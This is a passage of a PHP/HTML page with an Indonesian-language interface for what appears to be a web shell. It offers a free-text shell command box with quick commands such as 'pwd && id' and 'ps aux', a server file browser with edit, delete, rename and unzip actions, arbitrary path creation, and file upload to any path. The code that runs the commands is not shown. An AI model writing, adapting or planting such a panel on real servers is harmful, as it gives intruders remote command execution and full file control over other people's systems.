                    <?php endif; ?>
                </div>
            </div>

            <div class="quick-cmds">
                <button type="button" onclick="setQuickCmd('ls -la')">ls -la</button>
                <button type="button" onclick="setQuickCmd('pwd && id')">pwd &amp; id</button>
                <button type="button" onclick="setQuickCmd('df -h')">df -h</button>
                <button type="button" onclick="setQuickCmd('php -v')">php -v</button>
                <button type="button" onclick="setQuickCmd('ps aux')">ps aux</button>
            </div>

            <form method="POST" class="inline-form" style="margin-bottom:10px;">
                <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
                <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
                <input
                    type="text"
                    name="terminal_cmd"
                    id="terminal_cmd"
                    value="<?= htmlspecialchars($terminalLastCmd) ?>"
                    placeholder="Ketik perintah shell bebas..."
                    autocomplete="off"
                >
                <button type="submit" name="run_cmd">Jalankan</button>
            </form>

            <?php if (!empty($_SESSION['term_history'])): ?>
                <div class="quick-cmds">
                    <?php foreach (array_reverse($_SESSION['term_history']) as $histCmd): ?>
                        <button type="button" onclick="setQuickCmd(<?= htmlspecialchars(json_encode($histCmd), ENT_QUOTES) ?>)">
                            <?= htmlspecialchars($histCmd) ?>
                        </button>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>

            <div class="terminal-output"><?php
                if ($terminalLastCmd !== '' || $terminalOutput !== '') {
                    echo '<div class="terminal-prompt-line">' . htmlspecialchars($posixUser . '@' . ($_SERVER['SERVER_NAME'] ?? 'localhost') . ':' . $browseAbs . '$ ' . $terminalLastCmd) . '</div>';
                    echo htmlspecialchars($terminalOutput);
                    if ($terminalExitCode !== null && $terminalExitCode !== 0) {
                        echo '<div class="terminal-code-err">Exit code: ' . (int) $terminalExitCode . '</div>';
                    }
                } else {
                    echo 'Siap menerima perintah shell.';
                }
            ?></div>
        </div>

        <?php if ($viewFileName !== '' && $viewFileContent !== null): ?>
            <div class="viewer-panel">
                <div class="viewer-header">
                    <h3><?= $viewIsEditable ? 'Edit File' : 'Lihat File (Read-Only)' ?>: <code><?= htmlspecialchars($viewFileName) ?></code></h3>
                    <a class="btn btn-secondary" href="?dir=<?= urlencode($browseAbs) ?>&target=<?= urlencode($targetAbs) ?>">Tutup</a>
                </div>
                <?php if ($viewIsEditable): ?>
                    <form method="POST">
                        <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
                        <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
                        <input type="hidden" name="edit_filename" value="<?= htmlspecialchars($viewFileName) ?>">
                        <textarea class="editor-box" name="file_content"><?= htmlspecialchars($viewFileContent) ?></textarea>
                        <button type="submit" name="save_edit">Simpan Perubahan</button>
                    </form>
                <?php else: ?>
                    <textarea class="editor-box" readonly><?= htmlspecialchars($viewFileContent) ?></textarea>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <form method="POST">
            <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
            <label for="custom_path">Ubah / Lompat / Buat Path Server (diketik bebas)</label>
            <div class="path-row">
                <input type="text" name="custom_path" id="custom_path" value="<?= htmlspecialchars($browseAbs) ?>" placeholder="/path/tujuan/di/server">
                <button type="submit" name="jump_path" class="btn-secondary">Buka / Buat Path</button>
                <a class="btn btn-secondary" href="?dir=<?= urlencode($autoStartDir) ?>&target=<?= urlencode($autoStartDir) ?>">Auto Path</a>
            </div>
        </form>

        <div class="explorer">
            <div class="breadcrumb">
                <span>Path:</span>
                <?php foreach ($breadcrumbs as $idx => $bc): ?>
                    <?php if ($idx > 0): ?><span>/</span><?php endif; ?>
                    <a href="?dir=<?= urlencode($bc['path']) ?>&target=<?= urlencode($targetAbs) ?>">
                        <?= htmlspecialchars($bc['label']) ?>
                    </a>
                <?php endforeach; ?>
            </div>

            <div class="create-grid">
                <form method="POST" class="inline-form">
                    <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
                    <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
                    <input type="text" name="new_folder_name" placeholder="Nama folder baru" required>
                    <button type="submit" name="create_folder" class="btn-secondary">+ Folder</button>
                </form>

                <form method="POST" class="inline-form">
                    <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
                    <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
                    <input type="text" name="new_file_name" placeholder="Nama file baru (mis. catatan.txt)" required>
                    <button type="submit" name="create_file" class="btn-secondary">+ File</button>
                </form>
            </div>

            <div class="entry-list">
                <?php if ($browseAbs !== '/'): ?>
                    <?php $parentAbs = normalizeAbsPath(dirname($browseAbs)); ?>
                    <div class="entry-row">
                        <span class="entry-name">.. (Kembali ke folder atas)</span>
                        <div class="entry-actions">
                            <a class="btn btn-secondary" href="?dir=<?= urlencode($parentAbs) ?>&target=<?= urlencode($targetAbs) ?>">Buka</a>
                        </div>
                    </div>
                <?php endif; ?>

                <?php if (empty($subfolders) && empty($filesList)): ?>
                    <div class="empty">Direktori ini kosong atau tidak dapat dibaca.</div>
                <?php else: ?>
                    <?php foreach ($subfolders as $folder): ?>
                        <div class="entry-row">
                            <span class="entry-name">
                                [Folder] <?= htmlspecialchars($folder['name']) ?>
                                <?php if (!$folder['writable']): ?>
                                    <small style="color:#fca5a5;">(no write)</small>
                                <?php endif; ?>
                            </span>
                            <div class="entry-actions">
                                <?php if ($folder['readable']): ?>
                                    <a class="btn btn-secondary" href="?dir=<?= urlencode($folder['abs_path']) ?>&target=<?= urlencode($targetAbs) ?>">Buka Folder</a>
                                <?php endif; ?>
                                <button type="button" class="btn-secondary" onclick="renameEntry('<?= htmlspecialchars($folder['name'], ENT_QUOTES) ?>')">Rename</button>
                                <button type="button" class="btn-select" onclick="setTarget('<?= htmlspecialchars($folder['abs_path'], ENT_QUOTES) ?>')">Pilih</button>
                            </div>
                        </div>
                    <?php endforeach; ?>

                    <?php foreach ($filesList as $file): ?>
                        <div class="entry-row">
                            <span class="entry-name">
                                [File] <?= htmlspecialchars($file['name']) ?>
                                <span class="entry-meta">(<?= formatFileSize($file['size']) ?>)</span>
                            </span>
                            <div class="entry-actions">
                                <?php if ($file['readable']): ?>
                                    <a class="btn btn-secondary" href="?dir=<?= urlencode($browseAbs) ?>&target=<?= urlencode($targetAbs) ?>&view=<?= urlencode($file['name']) ?>">
                                        <?= $file['writable'] ? 'Edit' : 'Lihat' ?>
                                    </a>
                                <?php endif; ?>
                                <?php if ($file['is_zip']): ?>
                                    <form method="POST" style="display:inline;margin:0;">
                                        <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
                                        <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
                                        <input type="hidden" name="zip_filename" value="<?= htmlspecialchars($file['name']) ?>">
                                        <button type="submit" name="unzip_file" class="btn-zip">Unzip</button>
                                    </form>
                                <?php endif; ?>
                                <button type="button" class="btn-secondary" onclick="renameEntry('<?= htmlspecialchars($file['name'], ENT_QUOTES) ?>')">Rename</button>
                                <form method="POST" style="display:inline;margin:0;" onsubmit="return confirmDelete('<?= htmlspecialchars($file['name'], ENT_QUOTES) ?>');">
                                    <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
                                    <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
                                    <input type="hidden" name="delete_filename" value="<?= htmlspecialchars($file['name']) ?>">
                                    <button type="submit" name="delete_file" class="btn-danger">Delete</button>
                                </form>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>

        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">

            <label for="target_path">Path Tujuan Upload File (otomatis dibuat jika belum ada)</label>
            <div class="path-row">
                <input type="text" name="target_path" id="target_path" value="<?= htmlspecialchars($targetAbs) ?>" required>
                <button type="button" class="btn-secondary" onclick="setTarget('<?= htmlspecialchars($browseAbs, ENT_QUOTES) ?>')">Samakan dgn Folder Aktif</button>
            </div>

            <label for="file">Pilih File</label>
            <input type="file" name="file" id="file" required>

            <button type="submit">Upload File</button>
        </form>
    <?php endif; ?>
</div>

<form id="renameForm" method="POST" style="display:none;">
    <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
    <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
    <input type="hidden" name="old_name" id="rename_old_name">
    <input type="hidden" name="new_name" id="rename_new_name">
    <input type="hidden" name="rename_item" value="1">
</form>

<script>
function setTarget(absPath) {
    const targetInput = document.getElementById('target_path');
    const customInput = document.getElementById('custom_path');
    if (targetInput) {
        targetInput.value = absPath;
    }
    if (customInput) {
        customInput.value = absPath;
    }
}

function setQuickCmd(cmd) {
    const cmdInput = document.getElementById('terminal_cmd');
    if (cmdInput) {
        cmdInput.value = cmd;
        cmdInput.focus();
    }
}

function renameEntry(oldName) {
    const nextName = prompt('Masukkan nama baru untuk "' + oldName + '":', oldName);
    if (!nextName || nextName.trim() === '' || nextName.trim() === oldName) {
        return;
    }
    document.getElementById('rename_old_name').value = oldName;
    document.getElementById('rename_new_name').value = nextName.trim();
    document.getElementById('renameForm').submit();
}

function confirmDelete(fileName) {
    return confirm('Hapus file "' + fileName + '" secara permanen?');
}
</script>
</body>
</html>